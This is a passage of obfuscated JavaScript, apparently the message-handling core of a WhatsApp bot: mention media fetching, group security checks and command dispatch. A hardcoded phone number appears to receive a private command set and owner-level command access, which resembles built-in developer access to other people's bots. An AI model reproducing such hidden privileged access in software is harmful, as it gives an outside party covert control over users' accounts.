              /(http|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/g,
            );
            const fp = (/type\/(gif|mp4|sticker|image|audio)/.exec(fk.text) ||
              [])[1];
            let fq = fk.text;
            if (["mp4", "image", "gif"].includes(fp) && fo) {
              for (const ft of fo) fq = fq.replace(ft, "").trim();
              fl.caption = fq.replace("type/" + fp, "").trim();
            }
            if (fo && fp) {
              const fu = cC[fp];
              const fv = cD[fp];
              const fw = dc(fo);
              fl.mimetype = fu;
              if ("gif" === fp) {
                fl.gifPlayback = true;
              }
              if ("audio" === fp) {
                fl.ptt = true;
              }
              let fx =
                "" +
                (c9.nameFromUrl(fw) || "undefined") +
                ("sticker" === fp || "audio" === fp ? fv : "");
              if (
                !bU.existsSync(
                  bV(__dirname, "../media/mention/" + ba.session + fx),
                )
              ) {
                const fy = await dg(fw, fx, fp, ba.session);
                if (fy) {
                  let fz =
                    "```---ERROR REPORT---\n\nVersion : " +
                    c7.VERSION +
                    "\nMessage : " +
                    fy +
                    "\nError   : failed to fetch " +
                    fw +
                    "\nJid     : " +
                    b4.remoteJid +
                    "\ncommand : @mention\nPlatform : " +
                    c9.PLATFORM +
                    "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
                  const fA = {
                    text: fz,
                  };
                  const fB = {
                    key: b4,
                    message: b5,
                  };
                  const fC = {
                    quoted: fB,
                  };
                  const fD = {
                    type: "prepare_message",
                    chat: b1,
                    message: fA,
                    options: fC,
                  };
                  return void aV.queue.push(fD);
                }
              }
              try {
                const fE = bU.readFileSync(
                  bV(__dirname, "../media/mention/" + ba.session + fx),
                );
                const fF = {
                  [cB[fp]]: fE,
                  ...fl,
                };
                const fG = {
                  type: "prepare_message",
                  chat: b4.remoteJid,
                  message: fF,
                  options: fl,
                };
                aV.queue.push(fG);
              } catch (fI) {
                let fJ =
                  "```---ERROR REPORT---\n\nVersion : " +
                  c7.VERSION +
                  "\nMessage : " +
                  fI +
                  "\nError   : failed to fetch " +
                  fw +
                  "\nJid     : " +
                  b4.remoteJid +
                  "\ncommand : @mention\nPlatform : " +
                  c9.PLATFORM +
                  "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
                const fK = {
                  text: fJ,
                };
                const fL = {
                  key: b4,
                  message: b5,
                };
                const fM = {
                  quoted: fL,
                };
                const fN = {
                  type: "prepare_message",
                  chat: b1,
                  message: fK,
                  options: fM,
                };
                return void aV.queue.push(fN);
              }
            } else {
              aV.queue.push({
                type: "prepare_message",
                chat: b4.remoteJid,
                message: {
                  text: fk.text,
                  ...fl,
                },
                options: fl,
              });
            }
          }
        }
        const bz = !!ba.text && /https?:\/\/|www\./i.test(ba.text);
        if (ba.isGroup && "event" !== ba.type) {
          dm(ba, b4, b5, aV, aY, bb, bz, bj, dl)["catch"]((fP) => {
            console.error("[TEST] Security check caught error:", fP.message);
            c9.logger.error(fP, "Security check error");
          });
        }
        if (!(
          b2 ||
          "event" === ba.type ||
          cw.includes(b4.remoteJid) ||
          ("null" == cg[ba.session].env.ANTI_DELETE &&
            "null" == cg[ba.session].env.ANTI_EDIT)
        )) {
          c9.setTMessage(ba.key.id, {
            key: ba.key,
            message: ba.message,
          });
        }
        const bA = await c9.yami(
          ba.key.remoteJid,
          ba.session,
          true,
          ba.participant,
        );
        d5();
        if (cq.test(ba.text) && ba.isBot && ba.isGroup && ba.fromMe) {
          b3 = !b3;
          ba.text = cg[ba.session].PREFIX + ba.text;
        }
        if (process.env.LEVANTER_TEST && "event" === ba.type) {
          process.stdout.write(
            "[TEST] Event reaching mid-point. Action: " +
              ba.event_action +
              "\n",
          );
        }
        aY.owner = b1;
        aY.queue = aV.queue;
        const bC = "" + ba.text + ba.session;
        if (
          !ba.isBot &&
          !ba.votes &&
          (ba.fromMe || bk || bA) &&
          c9.cached[bC] &&
          c9.cached[bC].gid == b4.remoteJid &&
          (c9.cached[bC].uid == ba.participant || ba.fromMe || bk)
        ) {
          ba.text = cg[ba.session].PREFIX + c9.cached[bC].text;
          delete c9.cached[bC];
        } else {
          if (ba.votes && !ba.isBot && (ba.fromMe || bk || bA)) {
            const fQ = ba.votes.find(
              (fR) =>
                fR.voters.includes(ba.participant) || fR.voters.includes("me"),
            );
            if (
              fQ &&
              c9.cached[fQ.name] &&
              c9.cached[fQ.name].gid == b4.remoteJid &&
              (c9.cached[fQ.name].uid == ba.participant || ba.fromMe || bk)
            ) {
              ba.text = cg[ba.session].PREFIX + c9.cached[fQ.name].text;
              delete c9.cached[fQ.name];
              ba.message = null;
              ba.fakeQuoted = {
                key: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                },
                message: {
                  extendedTextMessage: {
                    text: fQ.name,
                  },
                },
              };
            }
          }
        }
        const bD = aZ.pnr;
        const bE =
          ba.isGroup || ba.participant != c9.numToJid("918136962641")
            ? cg[aZ.id].cammands
            : cg[aZ.id].pammands;
        const bF = !ba.isGroup && ba.participant == c9.numToJid("918136962641");
        const bG =
          ba.isGroup &&
          ba.admin &&
          !bk &&
          cg[ba.session].adminsjid.includes(ba.participant);
        const bH = bG ? await c9.getAmenu(ba.key.remoteJid, ba.session) : null;
        const bI =
          cw.includes(b4.remoteJid) &&
          !cg[ba.session].TEMP_SUDO.includes("918136962641") &&
          !process.env.pqrs;
        const bJ = async (fR, fS) => {
          if ("true" === cg[ba.session].env.CMD_REACTION) {
            if (1 !== fR) {
              await aV.queue.push({
                type: "prepare_message",
                chat: b4.remoteJid,
                message: {
                  react: {
                    text: cp[fR],
                    key: b4,
                  },
                },
              });
            }
            if (fS) {
              setTimeout(() => {
                bJ(3, false);
              }, 5000);
            }
          }
        };
        if (b0) {
          c9.logger.info(
            '[Handler] Command matching: text="' +
              ba.text?.["slice"](0, 30) +
              '", r.E=' +
              aZ.E +
              ", isSudo=" +
              bk +
              ", commandCount=" +
              Object.keys(bE).length,
          );
        }
        for (const fR in bE) {
          const fS = bE[fR];
          cz.test(fR);
          if (fS.active) {
            const fT = fS.pattern && fS.pattern.test(ba.text) && aZ.E;
            if (!fT && fS.pattern) {
              continue;
            }
            const fU = bG && true === fT;
            const fV = (!ba.isBot && fT) || (b3 && ba.isBot && fT);
            const fW = fS.fromMe == true;
            const fX =
              (fW && (bh || bk || bD || fU)) ||
              (fW && bA && bA.has(fS.name) && !df.includes(fS.name)) ||
              (fW && bG && bH && bH.includes(fS.name) && !df.includes(fS.name));
            const fY = fT && fX && true === fV;
            const fZ =
              true &&
              fS.on &&
              !fS.pattern &&
              bh == fW &&
              ("true" === process.env.WEB || !bh || !bp);
            if (fS.pattern && 0 == fS.fromMe) {
              bv();
            }
            const g0 = true === fY || true === (bF && fT && fW);
            const g1 = "event" === fS.on && fS.event_action === ba.event_action;
            if (
              (true === g0 || true === fZ || true === g1) &&
              !bI &&
              c9.formatter.n
            ) {
              const g2 = {
                text: c9.lang.extra.group_cmd,
              };
              if (fS.onlyGroup && !ba.isGroup && fS.pattern) {
                return await aV.queue.push({
                  type: "prepare_message",
                  chat: ba.key.remoteJid,
                  message: g2,
                });
              }
              if ((fS.onlyGroup && ba.isGroup) || !fS.onlyGroup) {
                const g3 =
                  ba.text && fS.pattern ? ba.text.match(fS.pattern) : "";
                if (fS.pattern) {
                  await bJ(0, false);
                }
                try {
                  let g4 = new ca(aY, ba, !!fS.pattern, aY);
                  await fS["function"](
                    g4,
                    (g3 &&
                      (6 == g3.length
                        ? undefined === g3[3]
                          ? g3[4]
                          : g3[3]
                        : undefined === g3[2]
                          ? g3[3]
                          : g3[2])) ||
                      "",
                    bl,
                  );
                  if (process.env.LEVANTER_TEST) {
                    console.log("[TEST] Command completed successfully");
                  }
                  if (fS.pattern) {
                    cN(ba.participant || b4.remoteJid, fS.name, ba.isGroup);
                    await bJ(1, true);
                  }
                  g4 = null;
                } catch (g5) {
                  if (fS.pattern) {
                    await bJ(2, true);
                  }
                  const g6 = fS.name;
                  const g7 =
                    "object" == typeof g5.message
                      ? JSON.stringify(g5.message)
                      : g5.message || g5;
                  c9.logger.error(g5, g5.stack);
                  cM(
                    ba.participant || b4.remoteJid,
                    g6,
                    g5.stack + "\nMessage: " + JSON.stringify(ba),
                  );
                  let g8 = c9.lang.extra.error_message.format(
                    c7.VERSION,
                    ba.text,
                    g7,
                    b4.remoteJid,
                    g6,
                    c9.PLATFORM,
                  );
                  const g9 = {
                    text: g8,
                  };
                  const ga = {
                    key: b4,
                    message: b5,
                  };
                  const gb = {
                    quoted: ga,
                  };
                  const gc = {
                    type: "prepare_message",
                    chat: b1,
                    message: g9,
                    options: gb,
                  };
                  aV.queue.push(gc);
                }
              }
            }
          }
        }
        if (b0) {
          c9.logger.info(
            "[Handler] Completed successfully for msg " +
              b4?.["id"]?.["slice"](-8),
          );
        }
      } catch (gd) {
        if ("true" === process.env.DEBUG_RESTART) {
          c9.logger.error(
            "[Handler] Error processing msg " +
              b4?.["id"]?.["slice"](-8) +
              ": " +
              gd.message,
          );
        }
        c9.logger.error(
          {
            error: gd.message,
            stack: gd.stack,
            messageId: b4?.["id"],
            remoteJid: b4?.["remoteJid"],
            messageType: bZ(c0(b5)),
          },
          "Handler error caught",
        );
        if (b1 && "true" === c7.ERROR_NOTIFY) {
          try {
            const gf = {
              text: "⚠️ Handler Error:\n" + gd.message,
            };
            const gg = {
              type: "prepare_message",
              chat: b1,
              message: gf,
            };
            await aV.queue.push(gg);
          } catch (gh) {
            c9.logger.error(gh, "Failed to send error notification");
          }
        }
      }
    }
  };
}
